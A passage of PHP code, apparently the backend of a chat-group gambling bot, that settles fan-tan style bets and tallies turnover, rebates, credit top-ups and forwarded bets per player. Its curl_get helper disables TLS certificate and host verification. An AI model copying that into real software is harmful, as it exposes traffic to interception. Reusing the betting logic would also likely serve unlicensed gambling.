{
    $js = (int)cache('ls' . $type);
    if ($js == 60 || !$js) {
        $js = 49;
    } else {
        $js = $js + 1;
    }
    cache('ls' . $type, $js);
    return $js;
}

function get_time_arr($data)
{
    $d = $data["day"];
    $day = $data['timeType'] == 0 ? $d : date('Y-m-d', strtotime("$d +1 day"));
    $day2 = date('Y-m-d', strtotime("$d -1 day"));
    $dayList = $data['timeType'] == 0 ? ([$data['day'] . ' 00:00:00', $data['day'] . ' 23:59:59']) : ([$d . ' 06:00:00', $day . ' 05:59:59']);
    $dayList2 = $data['timeType'] == 0 ? ([$day2 . ' 00:00:00', $day2 . ' 23:59:59']) : ([$day2 . ' 06:00:00', $d . ' 05:59:59']);
    return ['d' => $dayList, 'd2' => $dayList2];
}

function get_target($data)
{
    if (isset($data['id'])) {
        $map = $data['id'];
    } else if (session('user_id2')) {
        $map = session('user_id2');
    } else {
        $check = session('check_id');
        if ($check) {
            $checkTime = session('check_time' . $check);
            if (($checkTime + 30 * 60) < time()) {
                $map = '';
            } else {
                $map = $check;
            }
        } else {
            $map = session('user_id2');
        }
    }
    return $map;
}

function get_Liushui($user, $rb)
{
    list($type, $liu, $liu2, $ying, $kui, $allQi, $weijie, $yijie, $txt) = get_Yingkui($user, $rb);
    if ($rb['ls'] == 1) {
        $lius = '@' . $user['NickName'] . ':
累计' . ($type == 75 ? '有效' : '单边') . '流水:' . sprintf('%.2f', $liu) . '
盈亏:' . sprintf('%.2f', ($ying - $kui)) . '
期数:' . count($allQi);
    } else {
        if ($type == 75) {
            $lius = '@' . $user['NickName'] . ':
累计有效流水:' . sprintf('%.2f', $liu) . '
盈亏:' . sprintf('%.2f', ($ying - $kui)) . '
期数:' . count($allQi);
        } else {
            $lius = '@' . $user['NickName'] . ':
累计双边流水:' . sprintf('%.2f', $liu2) . '
盈亏:' . sprintf('%.2f', ($ying - $kui)) . '
期数:' . count($allQi);
        }
    }
    return $lius;
}

function get_Yingkui($user, $rb)
{
    $timer = get_time_arr(['day' => getTimeList(), 'timeType' => 1]);
    $dayList = $timer['d'];
    $type = $user['gid'];
    $recordList = db('record')->where('gameType', $type)->where('name', $user['wxid'])->where('type', 3)->where('chi', 0)->where('dtGenerate', 'between', $dayList)->select();
    list($arr, $allQi, $yijie, $weijie) = resetOrder($recordList);
    $ying = $arr['totalYing'];
    $kui = $arr['totalKui'];
    $liu = $arr['totalYouXiaoLiuShui'];
    $liu2 = $arr['totalYouXiaoLiuShuis'];
    $txt = $rb['ls'] == 1 ? '单边流水' : '双边流水';
    return [$type, $liu, $liu2, $ying, $kui, $allQi, $weijie, $yijie, $txt];
}

function getShuang($val)
{
    $chetui = ['123', '132', '231', '213', '321', '312', '124', '142', '421', '412', '214', '241', '234', '243', '324', '342', '432', '423', '134', '143', '341', '314', '413', '431'];
    $tong = ['12无3', '21无3', '12无4', '21无4', '13无2', '31无2', '13无4', '31无4', '14无2', '41无2', '14无3', '41无3', '23无1', '32无1', '23无4', '32无4', '24无1', '42无1', '24无3', '42无3', '34无1', '43无1', '34无2', '43无2', '1通23', '1通24', '1通34', '1通32', '1通42', '1通43', '2通13', '2通14', '2通34', '2通31', '2通41', '2通43', '3通12', '3通14', '3通24', '3通12', '3通41', '3通42', '4通12', '4通13', '4通23', '4通21', '4通31', '4通32'];
    $wanfaArr = ['1无2', '1无4', '2无1', '2无3', '3无2', '3无4', '4无1', '4无3', '1加34', '1加43', '1加23', '1加32', '2加34', '2加43', '2加41', '2加14', '3加14', '3加41', '3加12', '3加21', '4加12', '4加21', '4加23', '4加32'];
    $str = $val['text'];
    $arr2 = explode('/', $str);
    if (strstr($str, '车') || strstr($str, '推') || in_array($arr2[0], $chetui)) {
        return $val['totalYing'];
    } elseif (in_array($arr2[0], $tong)) {
        return $val['score'] * 0.5;
    } elseif (in_array($arr2[0], $wanfaArr)) {
        return $val['score'];
    } else {
        return $val['score'];
    }
}

function  getZuoyu($val)
{
    $zuoYu = 0;
    if ($val['type'] == 3 && $val['status'] == 1) {
        // if ($val['ying']==1||$val['ying']==3) {
        //     if($val['ying']==1){
        //         $zuoYu = bcadd(bcsub($val['afterScore'] , $val['yingScore'],2),$zuoYu,2);
        //     }else{
        //         $zuoYu = bcadd($zuoYu,$val['afterScore'],2);
        //     }
        // } else {
        //     $zuoYu = bcadd($zuoYu,bcadd($val['afterScore'] , $val['score'],2),2);
        // }
    } elseif ($val['type'] == 4 && $val['isTy'] == 1) {
        // if($val['sys']=='shang'){
        //     $zuoYu = bcadd(bcsub($val['afterScore'] , $val['score'],2),$zuoYu,2);
        // }else{
        //     $zuoYu = bcadd($zuoYu,bcadd($val['afterScore'] , $val['score'],2),2);
        // }
    } else {
        // $zuoYu = bcadd($zuoYu,$val['afterScore'],2);
    }
    $zuoYu = bcadd($zuoYu, $val['zuoyu'], 2);
    return $zuoYu;
}

function  resetOrder($list, $type = '')
{
    $arr['detail'] = $arr['list'] = $arrzy2 = $allQi = [];
    $arr['totalZuoYu'] = $arr['totalLiuShui'] = $arr['totalYing'] = $arr['totalKui'] = $arr['totalYouXiaoLiuShui'] = $arr['totalYouXiaoLiuShuis'] = $arr['totalValidLiuShuis'] = $arr['robotName'] = $arr['shortRobotName'] = $arr['totalYingKui'] = $arr['totalFanShui'] = $arr['totalUp'] = $arr['totalDown'] = $arr['totalUpDown'] = $arr['flyersSuc'] = $arr['flyersFail'] = $arr['flyersWait'] = $weijie = $yijie = 0;
    foreach ($list as $k => $val) {
        // if (($val['type']==3&&$val['time']&&$val['status']==1)||($val['type']==4&&$val['dtGenerate']&&$val['isTy']==1)) {
        if (($val['type'] == 3) || ($val['type'] == 4 && $val['dtGenerate'] && $val['isTy'] == 1)) {
            if ($val['flyers_status'] == 2) {
                $flyers_status = '飞单成功';
                $flyers_color = "green";
                if ($val['type'] == 3) {
                    $arr['flyersSuc'] += 1;
                }
            }
            if ($val['flyers_status'] == 3) {
                $flyers_status = '飞单失败';
                $flyers_color = "red";
                if ($val['type'] == 3) {
                    $arr['flyersFail'] += 1;
                }
            }
            if (in_array($val['flyers_status'], [0, 1])) {
                $flyers_status = '未飞单';
                $flyers_color = "";
                if ($val['type'] == 3) {
                    $arr['flyersWait'] += 1;
                }
            }
            $ben = $val['ying'] == 0 ? $val['score'] : 0;
            $wxid2 = substr($val['name'], 5, 8);
            list($recordFan, $allLiu, $ying, $Up, $Down, $liu, $kui, $sliu) = getRecordData($val);
            if (!in_array($wxid2, $arrzy2)) {
                $zuoYu = getZuoyu($val);
                array_push($arrzy2, $wxid2);
                array_push($arr['detail'], [
                    "wxid" => $val['name'],
                    "NickName" => $val['wid'],
                    'ying' => $ying,
                    'ben' => $ben,
                    'zong' => $val['score'],
                    'score' => $val['afterScore'],
                    "ZuoYu" => $zuoYu,
                    "totalUp" => $Up,
                    "totalDown" => $Down,
                    "totalUpDown" => bcsub($Up, $Down, 2),
                    "totalYingKui" => bcsub($ying, $kui, 2),
                    "totalLiuShui" => $liu,
                    "totalFanShui" => $recordFan,
                    "totalValidLiuShui" => $allLiu,
                    "totalValidLiuShuis" => $sliu
                ]);
                $arr['totalZuoYu'] = bcadd($arr['totalZuoYu'], $zuoYu, 2);
                $arr['totalValidLiuShuis'] = bcadd($arr['totalValidLiuShuis'], $sliu, 2);
                $arr['robotName'] = strtolower($val['rid']);
                $arr['shortRobotName'] = strtolower($val['rid']);
            } else {
                foreach ($arrzy2 as $y => $value) {
                    if ($value == $wxid2) {
                        $arr['detail'][$y]['NickName'] = $val['wid'];
                        $arr['detail'][$y]['ying'] = bcadd($arr['detail'][$y]['ying'], $ying, 2);
                        $arr['detail'][$y]['ben'] = bcadd($arr['detail'][$y]['ben'], $ben, 2);
                        $arr['detail'][$y]['zong'] = bcadd($arr['detail'][$y]['zong'], $val['score'], 2);
                        $arr['detail'][$y]['score'] = bcadd($arr['detail'][$y]['score'], $val['afterScore'], 2);
                        $arr['detail'][$y]['totalUp'] = bcadd($arr['detail'][$y]['totalUp'], $Up, 2);
                        $arr['detail'][$y]['totalDown'] = bcadd($arr['detail'][$y]['totalDown'], $Down, 2);
                        $arr['detail'][$y]['totalUpDown'] = bcadd($arr['detail'][$y]['totalUpDown'], bcsub($Up, $Down, 2), 2);
                        $arr['detail'][$y]['totalYingKui']  = bcadd($arr['detail'][$y]['totalYingKui'], bcsub($ying, $kui, 2), 2);
                        $arr['detail'][$y]['totalLiuShui'] = bcadd($arr['detail'][$y]['totalLiuShui'], $liu, 2);
                        $arr['detail'][$y]['totalFanShui'] = bcadd($arr['detail'][$y]['totalFanShui'], $recordFan, 2);
                        $arr['detail'][$y]['totalValidLiuShui']  = bcadd($arr['detail'][$y]['totalValidLiuShui'], $allLiu, 2);
                        $arr['detail'][$y]['totalValidLiuShuis']  = bcadd($arr['detail'][$y]['totalValidLiuShuis'], $sliu, 2);
                    }
                }
            }
            if ($val['status'] == 1) {
                $yijie++;
            } else {
                $weijie++;
            }
            if (!in_array($val['qihao'], $allQi)) {
                array_push($allQi, $val['qihao']);
            }
            if ($type) {
                $has = db('history')->where('type', $val['gameType'])->where('QiHao', $val['qihao'])->find();
                $fan = $has['Code'] ? getFan($has, $val) : '';
                if ($val['ying'] == 1) {
                    $count = $ying;
                } elseif ($val['ying'] == 0) {
                    $count = '-' . $val['score'];
                } elseif ($val['ying'] == 3) {
                    $count = "0.00";
                } else {
                    if ($val['sys'] == 'shang') {
                        $count = $val['score'];
                    } else {
                        $count = '-' . $val['score'];
                    }
                }
                $val["dttype"] = ($val['sys'] == 'shang' ? 0 : ($val['sys'] == 'xia' ? 1 : 5));
                $val["count"] = ($val['type'] == 4 ? $count : ($val['status'] == 1 ? $count : 0));
                $val["code"] = $has['Code'];
                $val["lastResult"] = $fan ? getCum($has, $val) : '';
                $val["fan"] = $fan;
                $val["dtfanshui"] = $recordFan;
                $val["afterScore"] = floatval($val['afterScore']);
                $val["cmdText"] = getQiuWf($val['gameType'], $val['qiuNum']) . $val['text'];
                $val["dtCmd"] = $val['dtGenerate'];
                $val["dtJieSuan"] = ($val['status'] == 1 ? $val['time'] : ($val['type'] == 4 ? $val['time'] : '未结算订单'));
                $val['flyersStatus'] = $flyers_status;
                $val['flyersColor'] = $flyers_color;
                $val['zhuscore'] = $val['score'];
                $val['validscore'] = $val['score'];
                $val['result'] = ($val['ying'] == 1 ? "赢" : '输');
                $val['opencode'] = $has['Code'];
                $val['lastcode'] = $fan ? getCum($has, $val) : '';
                $val['submitStatus'] = ($val['status'] == 1 ? 1 : 0);
                $val['dtwxid'] = $val['name'];
                $val['dtNickName'] = $val['wid'];
                array_push($arr['list'], $val);
            }
            $arr['totalLiuShui'] = bcadd($arr['totalLiuShui'], $liu, 2);
            $arr['totalKui'] = bcadd($arr['totalKui'], $kui, 2);
            $arr['totalYing'] = bcadd($arr['totalYing'], $ying, 2);
            $arr['totalYouXiaoLiuShui'] = bcadd($arr['totalYouXiaoLiuShui'], $allLiu, 2);
            $arr['totalYingKui'] = bcadd($arr['totalYingKui'], bcsub($ying, $kui, 2), 2);
            $arr['totalFanShui'] = bcadd($arr['totalFanShui'], $recordFan, 2);
            $arr['totalUp'] = bcadd($arr['totalUp'], $Up, 2);
            $arr['totalDown'] = bcadd($arr['totalDown'], $Down, 2);
            $arr['totalYouXiaoLiuShuis'] = bcadd($arr['totalYouXiaoLiuShuis'], $sliu, 2);
            $arr['totalUpDown'] = bcadd($arr['totalUpDown'], bcsub($Up, $Down, 2), 2);
            //总上下分减数
          //  $arr['totalUpDown'] = bcadd($arr['totalUpDown'], bcsub($Up, $Down, 2), 2);
        }
    }
    return [$arr, $allQi, $yijie, $weijie];
}

function  jiesuan($value, $kj)
{
    $fan = getFan($kj, $value);
    $dan = getKjDs($kj, $value);
    $da = getKjDx($kj, $value);
    $str = $value['text'];
    $frist = mb_substr($str, 0, 1, "UTF-8");
    $last = mb_substr($str, 1, strlen($str), "UTF-8");
    $arr2 = explode('/', $str);
    $score2 = 0;
    $ying = $value['score'];
    $status = 0;
    $score = $value['score'];
    $daxiao = ['单', '双', '13', '24', '42', '31', '大', '小'];
    $chetui = ['123', '132', '231', '213', '321', '312', '124', '142', '421', '412', '214', '241', '234', '243', '324', '342', '432', '423', '134', '143', '341', '314', '413', '431'];
    $jiao = ['12角', '23角', '34角', '14角', '13角', '24角', '12', '23', '34', '14', '13', '24', '21角', '32角', '43角', '41角', '21', '32', '43', '41'];
    $zheng = ['1正', '2正', '3正', '4正', '1堂', '2堂', '3堂', '4堂', '1无3', '2无4', '3无1', '4无2'];
    $tong = ['12无3', '21无3', '12无4', '21无4', '13无2', '31无2', '13无4', '31无4', '14无2', '41无2', '14无3', '41无3', '23无1', '32无1', '23无4', '32无4', '24无1', '42无1', '24无3', '42无3', '34无1', '43无1', '34无2', '43无2', '1通23', '1通24', '1通34', '1通32', '1通42', '1通43', '2通13', '2通14', '2通34', '2通31', '2通41', '2通43', '3通12', '3通14', '3通24', '3通12', '3通41', '3通42', '4通12', '4通13', '4通23', '4通21', '4通31', '4通32'];
    $wanfaArr = ['1无2', '1无4', '2无1', '2无3', '3无2', '3无4', '4无1', '4无3', '1加34', '1加43', '1加23', '1加32', '2加34', '2加43', '2加41', '2加14', '3加14', '3加41', '3加12', '3加21', '4加12', '4加21', '4加23', '4加32'];
    if ($kj['type'] == 75) {
        $wf = str_replace($value['score'], "", $value['text']);
        $frist = substr($wf, 0, 1);
        $kaiText = '';
        if (!is_numeric($frist)) {
            if ($wf == '单' || $wf == '双') {
                $kaiText = getZongDs($kj);
            }
            if ($wf == '大' || $wf == '小') {
                $kaiText = getZongDx($kj);
            }
            if ($wf == '尾大' || $wf == '尾小') {
                $kaiText = getZongWdx($kj);
            }
            if ($wf == '龙' || $wf == '虎') {
                $kaiText = getLongHu($kj);
            }
            if ($wf == getZongDx($kj) || $wf == getZongDs($kj) || $wf == getZongWdx($kj) || $wf == getLongHu($kj)) {
                $status = 1;
                $score = ($value['score'] * $value['peilv'] / 100);
                $score2 = $value['score'];
                xzjs($value, $status, $score, $score2, $ying, $kaiText);
            } else {
                db('record')->where('id', $value['id'])->update(['kai' => $kaiText]);
            }
        } else {
            if (strstr($wf, '单') || strstr($wf, '双')) {
                $kaiText = getQiuDs($kj, $frist);
            }
            if (strstr($wf, '大') || strstr($wf, '小')) {
                $kaiText = getQiuDx($kj, $frist);
            }
            if (strstr($wf, '尾大') || strstr($wf, '尾小')) {
                $kaiText = getQiuWdx($kj, $frist);
            }
            if ($wf == getQiuDx($kj, $frist) || $wf == getQiuDs($kj, $frist) || $wf == getQiuWdx($kj, $frist)) {
                $status = 1;
                $score = ($value['score'] * $value['peilv'] / 100);
                $score2 = $value['score'];
                xzjs($value, $status, $score, $score2, $ying, $kaiText);
            } else {
                db('record')->where('id', $value['id'])->update(['kai' => $kaiText]);
            }
        }
    } else {
        if (strstr($str, '特')) {
            $arr3 = explode('特', $str);
            if (strstr($arr3[0], '/')) {
                $arr4 = explode('/', $arr3[0]);
                foreach ($arr4 as $val) {
                    if ((string)getCum($kj, $value) == (string)$val) {
                        $status = 1;
                        $score = ($arr3[1] * $value['tePeilv']);
                        $score2 = $arr3[1] * $value['tePeilv'];
                        $ying = 0;
                        xzjs($value, $status, $score, $score2, $ying);
                        break;
                    }
                }
            } elseif (strstr($arr3[0], '-')) {
                $arr4 = explode('-', $arr3[0]);
                foreach ($arr4 as $val) {
                    if ((string)getCum($kj, $value) == (string)$val) {
                        $status = 1;
                        $score = ($arr3[1] * $value['tePeilv']);
                        $score2 = $arr3[1] * $value['tePeilv'];
                        $ying = 0;
                        xzjs($value, $status, $score, $score2, $ying);
                        break;
                    }
                }
            } else {
                if ((string)getCum($kj, $value) == (string)$arr3[0]) {
                    $status = 1;
                    $score = ($arr3[1] * $value['tePeilv']);
                    $score2 = $arr3[1] * $value['tePeilv'];
                    $ying = 0;
                    xzjs($value, $status, $score, $score2, $ying);
                }
            }
        } elseif (in_array($frist, $daxiao) || in_array($arr2[0], $daxiao)) {
            if (in_array($frist, $daxiao)) {
                if ($frist == $dan || $frist == $da) {
                    $status = 1;
                    $score = ($value['score'] * $value['peilv'] / 100);
                    $score2 = $value['score'];
                    xzjs($value, $status, $score, $score2, $ying);
                } else {
                    if ($da == '和' && ($frist == '大' || $frist == '小')) {
                        $status = 3;
                        $score = 0;
                        xzjs($value, $status, $score, $score2, $ying);
                    }
                }
            } else {
                if ((($arr2[0] == '13' || $arr2[0] == '31') && getCum($kj, $value) % 2 == 1) || (($arr2[0] == '24' || $arr2[0] == '42') && getCum($kj, $value) % 2 == 0)) {
                    $status = 1;
                    $score = ($value['score'] * $value['peilv'] / 100);
                    $score2 = $value['score'];
                    xzjs($value, $status, $score, $score2, $ying);
                }
            }
        } elseif (strstr($str, '车') || strstr($str, '推') || in_array($arr2[0], $chetui)) {
            if (in_array($arr2[0], $chetui)) {
                if ($arr2[0] == '124' || $arr2[0] == '241' || $arr2[0] == '142' || $arr2[0] == '214' || $arr2[0] == '421' || $arr2[0] == '412') {
                    $frist = '1';
                } elseif ($arr2[0] == '123' || $arr2[0] == '231' || $arr2[0] == '321' || $arr2[0] == '132' || $arr2[0] == '213' || $arr2[0] == '312') {
                    $frist = '2';
                } elseif ($arr2[0] == '234' || $arr2[0] == '243' || $arr2[0] == '324' || $arr2[0] == '342' || $arr2[0] == '432' || $arr2[0] == '423') {
                    $frist = '3';
                } else {
                    $frist = '4';
                }
            }
            if (($frist == '1' && strstr('124', (string)$fan)) || ($frist == '2' && strstr('123', (string)$fan)) || ($frist == '3' && strstr('234', (string)$fan)) || ($frist == '4' && strstr('134', (string)$fan))) {
                $status = 1;
                $score = ($value['score'] / 3 * $value['peilv'] / 100);
                $score2 = ($value['score'] / 3);
                xzjs($value, $status, $score, $score2, $ying);
            }
        } elseif (strstr($str, '番')) {
            if ($frist == (string)$fan) {
                $status = 1;
                $score = ($value['score'] * 3 * $value['peilv'] / 100);
                $score2 = $value['score'] * 3;
                xzjs($value, $status, $score, $score2, $ying);
            }
        } elseif (strstr($str, '正') || strstr($str, '堂') || in_array($arr2[0], $zheng)) {
            if (in_array($arr2[0], $zheng)) {
                if ($arr2[0] == '1无3') {
                    $frist = '1';
                } elseif ($arr2[0] == '2无4') {
                    $frist = '2';
                } elseif ($arr2[0] == '3无1') {
                    $frist = '3';
                } elseif ($arr2[0] == '4无2') {
                    $frist = '4';
                }
            }
            if ($frist == (string)$fan) {
                $status = 1;
                $score = ($value['score'] * $value['peilv'] / 100);
                $score2 = $value['score'];
                xzjs($value, $status, $score, $score2, $ying);
            } else {
                if (($frist == '1' && strstr('24', (string)$fan)) || ($frist == '2' && strstr('13', (string)$fan)) || ($frist == '3' && strstr('24', (string)$fan)) || ($frist == '4' && strstr('13', (string)$fan))) {
                    $status = 3;
                    $score = 0;
                    xzjs($value, $status, $score, $score2, $ying);
                }
            }
        } elseif (strstr($str, '角') || in_array($arr2[0], $jiao)) {
            if (in_array($arr2[0], $jiao)) {
                $j = $arr2[0];
            } else {
                $arr3 = explode('角', $str);
                $j = $arr3[0];
            }
            if (strstr($j, (string)$fan)) {
                $status = 1;
                $score = ($value['score'] * $value['peilv'] / 100);
                $score2 = $value['score'];
                xzjs($value, $status, $score, $score2, $ying);
            }
        } elseif (strstr($str, '严') || strstr($str, '念')) {
            if(strstr($str, '严/')||strstr($str, '念/')){
                if (strstr($str, '严/')) {
                    $arr3 = explode('严/', $str);
                }
                if (strstr($str, '念/')) {
                    $arr3 = explode('念/', $str);
                }
                $one = substr($arr3[0], 0, 1);
                $two = substr($arr3[0], 1, 1);
            }elseif (strstr($str, '/')) {
                if (strstr($arr2[0], '严')) {
                    $arr3 = explode('严', $arr2[0]);
                }
                if (strstr($arr2[0], '念')) {
                    $arr3 = explode('念', $arr2[0]);
                }
                $one = $arr3[0];
                $two = $arr3[1];
            } else {
                if (strstr($str, '严')) {
                    $arr3 = explode('严', $str);
                }
                if (strstr($str, '念')) {
                    $arr3 = explode('念', $str);
                }
                $one = substr($arr3[0], 0, 1);
                $two = substr($arr3[0], 1, 1);
            }
            if (strstr($one, (string)$fan)) {
                $status = 1;
                $score = ($value['score'] * 2 * $value['peilv'] / 100);
                $score2 = $value['score'] * 2;
                xzjs($value, $status, $score, $score2, $ying);
            } else {
                if (strstr($two, (string)$fan)) {
                    $status = 3;
                    $score = 0;
                    xzjs($value, $status, $score, $score2, $ying);
                }
            }
        } elseif (in_array($arr2[0], $tong)) {
            if (strstr($str, '无')) {
                $arr3 = explode('无', $arr2[0]);
                $one = $arr3[0];
                $two = $arr3[1];
            } else {
                $arr3 = explode('通', $arr2[0]);
                $one = $arr3[1];
                $two = $arr3[0];
            }
            if (strstr($one, (string)$fan)) {
                $status = 1;
                $score = ($value['score'] * 0.5 * $value['peilv'] / 100);
                $score2 = $value['score'] * 0.5;
                xzjs($value, $status, $score, $score2, $ying);
            } else {
                if (strstr($two, (string)$fan)) {
                } else {
                    $status = 3;
                    $score = 0;
                    xzjs($value, $status, $score, $score2, $ying);
                }
            }
        } elseif (in_array($arr2[0], $wanfaArr)) {
            if (strstr($str, '加')) {
                $arr3 = explode('加', $arr2[0]);
            }
            if (strstr($str, '无')) {
                $arr3 = explode('无', $arr2[0]);
            }
            if (strstr($arr3[0], (string)$fan)) {
                $status = 1;
                $score = ($value['score'] * $value['peilv'] / 100);
                $score2 = $value['score'];
                xzjs($value, $status, $score, $score2, $ying);
            } else {
                if (strstr($str, '加')) {
                    if (strstr($arr3[1], (string)$fan)) {
                        $status = 3;
                        $score = 0;
                        xzjs($value, $status, $score, $score2, $ying);
                    }
                } else {
                    if (strstr($arr3[1], (string)$fan)) {
                    } else {
                        $status = 3;
                        $score = 0;
                        xzjs($value, $status, $score, $score2, $ying);
                    }
                }
            }
        }
    }
    db('record')->where('id', $value['id'])->update(['time' => date("Y-m-d H:i:s"), 'status' => 1]);
}

function  getRecordData($val)
{
    $recordFan = $allLiu = $ying = $Up = $Down = $liu = $kui = $sliu = 0;
    if ($val['status'] == 1 && $val['ying'] == 1 && $val['type'] == 3) {
        if (strstr($val['text'], '特')) {
            $arr3 = explode('特', $val['text']);
            $ying = bcadd($ying, bcsub($val['yingScore'], $val['score'], 2), 2);
            $allLiu = bcadd($allLiu, $val['yingScore'], 2);  //修改Score统计字段yingScore
        } else {
            $ying = bcadd($ying, $val['yingScore'], 2);
            $allLiu = bcadd($allLiu, $val['yingScore'], 2);  //修改Score统计字段yingScore
        }
        if (strstr($val['text'], '特')) {
            $recordFan = bcadd($recordFan, bcmul($arr3[1], $val['teFanshui'], 2), 2);
        } else {
            // var_dump($val);
            $a_f1 = bcmul($val['yingScore'], 100, 2);
            //特报错注释
           // $b_f1 = bcdiv($a_f1, $val['peilv'], 2);
            $b_f1 = $val['yingScore'];  //原双边金额改成使用单边金额
            $c_f1 = bcdiv($val['fanshui'], 100, 2);
            $d_f1 = bcmul($b_f1, $c_f1, 2);
            $recordFan = bcadd($recordFan, $d_f1, 2);
            //  var_dump($recordFan);
        }
        $sliu = bcadd($sliu, getShuang($val), 2);
    }
    if ($val['sys'] == 'shang' && $val['isTy'] == 1) {
        $Up = bcadd($Up, $val['score'], 2);
    }
    if ($val['sys'] == 'xia' && $val['isTy'] == 1) {
        $Down = bcadd($Down, $val['score'], 2);
    }
    if ($val['type'] == 3) {
        $liu = bcadd($liu, $val['score'], 2);
    }
    if ($val['type'] == 3 && $val['ying'] == 0 && $val['status'] == 1) {
        $kui = bcadd($kui, $val['score'], 2);
        $sliu = bcadd($sliu, $val['score'], 2);
    }
    return [$recordFan, $allLiu, $ying, $Up, $Down, $liu, $kui, $sliu];
}

function  get_score_his($data)
{
    $timer = get_time_arr($data);
    $dayList = $timer['d'];
    $map = get_target($data);
    $arr['detail'] = [];
    $arr['totalZuoYu'] = 0;
    $arr['totalLiuShui'] = 0;
    $arr['totalYouXiaoLiuShui'] = 0;
    $arr['totalYouXiaoLiuShuis'] = 0;
    $arr['totalYingKui'] = 0;
    $arr['totalFanShui'] = 0;
    $arr['totalUp'] = 0;
    $arr['totalDown'] = 0;
    $arr['totalUpDown'] = 0;
    $recordList = db('record')->where('rid', $map)->where('type', 'exp', ' IN (3,4) ')->where('isTuo', 0)->where('chi', 0)->where('dtGenerate', 'between', $dayList)->select();
    list($arr, $allQi, $yijie, $weijie) = resetOrder($recordList);
     //昵称字母排序
    usort($arr['detail'], function($a, $b) {
        return strcmp($a['NickName'], $b['NickName']);
    });
//var_dump($arr['detail']);
    return $arr;
}

function get_score_his_detail($data)
{
    $timer = get_time_arr($data);
    $dayList = $timer['d'];
    $map = get_target($data);
    $rob = db('robot')->where('UserName', $map)->find();
    $result = db('record')->where('name', $data['wxid'])->where('rid', $map)->where('chi', 0)->where('type', 'exp', ' IN (3,4) ')->where('dtGenerate', 'between', $dayList)->order('dtGenerate asc')->select();
    list($arr, $allQi, $yijie, $weijie) = resetOrder($result, true);
    return $arr['list'];
}

function get_way_data($data)
{
    $arr = resetFolder($data);
    return $arr;
}

function get_way2_data($data)
{
    $arr = resetFolder($data);
    return $arr;
}

function resetFolder($data)
{
    $timer = get_time_arr($data);
    $dayList = $timer['d'];
    $map = get_target($data);
    $arr = [];
    $rob = db('robot')->where('UserName', $map)->find();
    if (strtotime($dayList[1]) >= strtotime($rob['addTime'])) {
        $list = db('folder')->where('rid', $map)->where('isTuo', 0)->where('time', 'between', $dayList)->where('status', 1)->order('time desc')->select();
        foreach ($list as $value) {
            array_push($arr, [
                "NickName" => $value['nickName'],
                "wxid" => $value['wxid'],
                "dt" => date('Y年m月d日 H:i:s', strtotime($value['time'])),
                "msg" => ($value['type'] == 0 ? "上分+" . $value['score'] : "下分-" . $value['score']),
                "type" => $value['type'],
                "des" => ($value['type'] == 0 ? "上分+" . $value['score'] : "下分-" . $value['score']),
            ]);
        }
    }
    return $arr;
}

function get_way3_data($data)
{
    $timer = get_time_arr($data);
    $dayList = $timer['d'];
    $map = get_target($data);
    $arr2 = [];
    $rob = db('robot')->where('UserName', $map)->find();
    $has = cache('lastQi' . $rob['type']);
    $result = db('record')->where('qihao', $has['QiHao'])->where('type', 3)->where('rid', $map)->where('dtGenerate', 'between', $dayList)->select();
    $his = db('history')->where('type', $rob['type'])->where('Code', '<>', '')->where('dtOpen', 'between', $dayList)->order('id desc')->limit(30)->select();
    list($arr, $allQi, $yijie, $weijie) = resetOrder($result, true);
    foreach ($his as $value) {
        $zhu = db('record')->where('qihao', $value['QiHao'])->where('type', 3)->where('rid', $map)->where('dtGenerate', 'between', $dayList)->count();
        $ying = db('record')->where('qihao', $value['QiHao'])->where('rid', $map)->where('type', 3)->where('ying', 1)->where('status', 1)->where('dtGenerate', 'between', $dayList)->sum('yingScore');
        $kui = db('record')->where('qihao', $value['QiHao'])->where('rid', $map)->where('type', 3)->where('ying', 0)->where('status', 1)->where('dtGenerate', 'between', $dayList)->sum('score');
        array_push($arr2, [
            "qihao" => "第" . $value['QiHao'] . "期",
            "totalZhu" => $zhu,
            "totalYingKui" => $ying - $zhu
        ]);
    }
    return ['lstJiLu' => $arr['list'], 'lstQiDuiZhang' => $arr2];
}

function getPeilv($data, $num = 1)
{
    $peilv = (($data['PeiLv'] / 100) * $num) + 1;
    return number_format($peilv, 3);
}

function getTePeilv($data)
{
    return sprintf('%.2f', $data['tePeilv']);
}

function curl_get($url)
{

    $header = array(
        'Accept: application/json',
    );
    $curl = curl_init();
    //设置抓取的url
    curl_setopt($curl, CURLOPT_URL, $url);
    //设置头文件的信息作为数据流输出
    curl_setopt($curl, CURLOPT_HEADER, 0);
    // 超时设置,以秒为单位
    curl_setopt($curl, CURLOPT_TIMEOUT, 30);
    // 超时设置，以毫秒为单位
    // curl_setopt($curl, CURLOPT_TIMEOUT_MS, 500); 
    // 设置请求头
    curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0');
    curl_setopt($curl, CURLOPT_HTTPHEADER, $header);
    //设置获取的信息以文件流的形式返回，而不是直接输出。
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    //执行命令
    $data = curl_exec($curl);
    // 显示错误信息
    if (curl_error($curl)) {
        return "Error: " . curl_error($curl);
    } else {
        // 打印返回的内容
        curl_close($curl);
        return $data;
    }
}

function ds($expect)
{
    $returnSet = [];
    foreach ($expect as $k => $v) {
        if ($v % 2 == 0)
            $returnSet[] = 1;
        else {
            $returnSet[] =  0;
        }
    }
    return $returnSet;
}

function dx($gid, $expect)
{
    $array = [];

    foreach ($expect as $v) {

        if ($gid == 101) {
            if ($v <= 4)
                $array[] = 1;
            else
                $array[] = 0;
        } else if ($gid == 121) {
            if ($v < 6)
                $array[] = 1;
            else if ($v < 10)
                $array[] = 0;
        } else if ($gid == 103) {
            if ($v < 11)
                $array[] = 1;
            else
                $array[] = 0;
        } else if ($gid == 151) {
            if ($v <= 3)
                $array[] = 1;
            else
                $array[] = 0;
        } else if ($gid == 161) {
            if ($v < 41)
                $array[] = 1;
            else
                $array[] = 0;
        } else if ($gid == 107) {
            if ($v <= 5)
                $array[] = 1;
            else
                $array[] = 0;
        } else if ($gid == 100) {
            if ($v < 25)
                $array[] = 1;
            else if ($v <= 49)
                $array[] = 0;
        }
    }
    return $array;
}


function wdx($expect)
{
    $array = [];
    foreach ($expect as $v) {
        $v = $v % 10;
        if ($v <= 4)
            $array[] = 1;
        else
            $array[] = 0;
    }
    return $array;
}

function zonghe($expect)
{
    $a = 0;
    $b = 1;
    $c = 0;
    $d = 0;
    //print_r($expect);die;
    foreach ($expect as $v) {
